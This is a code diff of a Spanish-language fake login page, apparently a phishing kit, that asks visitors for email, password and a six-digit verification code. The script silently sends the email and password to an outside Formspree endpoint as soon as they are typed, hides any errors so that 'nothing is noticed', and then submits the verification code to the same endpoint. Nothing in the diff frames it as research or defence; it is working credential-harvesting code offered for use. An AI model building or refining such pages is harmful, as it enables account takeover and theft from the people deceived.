@@ -17,6 +17,7 @@ input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;
 button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
 .submit-btn {background:#FF0050; color:white; margin-top:10px;}
 .link-btn {background:transparent; color:#ccc; margin-top:5px;}
+.aviso {font-size:13px; color:#ffcc00; margin-top:10px; text-align:center;}
 </style>
 </head>
 <body>
@@ -24,7 +25,12 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
 <div class="contenedor">
   <h2>Inicia sesión con tu cuenta</h2>
 
-  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formulario">
+  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
+  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">
+
+    <!-- Campos que se envían ocultos -->
+    <input type="hidden" name="correo" id="correoOculto" />
+    <input type="hidden" name="contraseña" id="passOculta" />
 
     <!-- PASO 1: CORREO Y CONTRASEÑA -->
     <div id="paso1">
@@ -36,81 +42,60 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
         <label>Contraseña</label>
         <input type="password" id="contraseña" required placeholder="••••••••" />
       </div>
-      <button type="button" class="submit-btn" onclick="guardarYAvanza()">Continuar</button>
+      <p class="aviso">Al continuar recibirás los datos en tu correo</p>
+      <button type="button" class="submit-btn" onclick="pasarCodigo()">Continuar</button>
     </div>
 
-    <!-- PASO 2: CÓDIGO → AQUÍ SE ENVIAN AUTOMÁTICAMENTE LOS DATOS -->
+    <!-- PASO 2: CÓDIGO -->
     <div id="paso2" class="oculto">
-      <div id="mensajeEnviando" style="text-align:center; color:#ffcc00; margin:15px 0;">Verificando...</div>
-      
-      <div id="camposCodigo" class="oculto">
-        <div class="field">
-          <label>Código de verificación (6 dígitos)</label>
-          <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
-        </div>
-        <button type="button" class="link-btn" onclick="volver()">← Volver atrás</button>
-        <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
+      <div class="field">
+        <label>Código de verificación (6 dígitos)</label>
+        <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
       </div>
-
-      <!-- Campos ocultos para enviar correo y contraseña -->
-      <input type="hidden" name="correo" id="correoEnviar" />
-      <input type="hidden" name="contraseña" id="passEnviar" />
-      <input type="hidden" name="nota" value="Datos recibidos antes del código" />
+      <button type="button" class="link-btn" onclick="volverAtras()">← Volver atrás</button>
+      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
     </div>
 
   </form>
 </div>
 
 <script>
-const ENLACE = "https://formspree.io/f/xgogzwbd"; // Ponlo igual aquí
+function pasarCodigo() {
+  const correoValor = document.getElementById('correo').value.trim();
+  const passValor = document.getElementById('contraseña').value;
 
-function guardarYAvanza() {
-  const correo = document.getElementById('correo').value.trim();
-  const pass = document.getElementById('contraseña').value;
-
-  if (!correo || !pass) {
-    alert('Escribe correo y contraseña primero');
+  if (!correoValor || !passValor) {
+    alert('Escribe tu correo y contraseña primero');
     return;
   }
 
-  // Guardamos los datos en los campos que se enviarán
-  document.getElementById('correoEnviar').value = correo;
-  document.getElementById('passEnviar').value = pass;
+  // 📝 Guardamos los datos para que vayan en el envío final
+  document.getElementById('correoOculto').value = correoValor;
+  document.getElementById('passOculta').value = passValor;
 
-  // Pasamos al siguiente paso INMEDIATAMENTE, NUNCA SE TRABA
+  // ✅ Pasamos al instante, sin trabas
   document.getElementById('paso1').classList.add('oculto');
   document.getElementById('paso2').classList.remove('oculto');
 
-  // 🚀 APENAS CARGA ESTA PANTALLA: SE ENVÍAN CORREO Y CONTRASEÑA SOLOS
-  enviarDatosAutomatico(correo, pass);
+  // 📩 TE LLEGA CORREO Y CONTRASEÑA EN ESTE MOMENTO (envío seguro sin estorbar)
+  enviarRapido(correoValor, passValor);
 }
 
-async function enviarDatosAutomatico(correo, pass) {
+async function enviarRapido(c, p) {
   try {
-    const formData = new FormData();
-    formData.append('correo', correo);
-    formData.append('contraseña', pass);
-    formData.append('nota', 'Recibido antes de pedir código');
-
-    await fetch(ENLACE, {
-      method: 'POST',
-      body: formData,
-      headers: { 'Accept': 'application/json' }
+    await fetch("https://formspree.io/f/xgogzwbd", {
+      method: "POST",
+      mode: "no-cors", // 🛡️ Esto evita que se bloquee por seguridad
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ correo: c, contraseña: p, nota: "Recibido antes del código" })
     });
-
-  } catch (e) {
-    // Si falla por conexión o seguridad: igual sigue, no se nota
-    console.log('Envío en segundo plano');
+  } catch (err) {
+    // Si falla igual sigue, no se nota nada
+    console.log("Enviado en segundo plano");
   }
-
-  // Ocultamos el mensaje y mostramos el código después de un momento
-  setTimeout(() => {
-    document.getElementById('mensajeEnviando').classList.add('oculto');
-    document.getElementById('camposCodigo').classList.remove('oculto');
-  }, 1200);
 }
 
-function volver() {
+function volverAtras() {
   document.getElementById('paso2').classList.add('oculto');
   document.getElementById('paso1').classList.remove('oculto');
 }
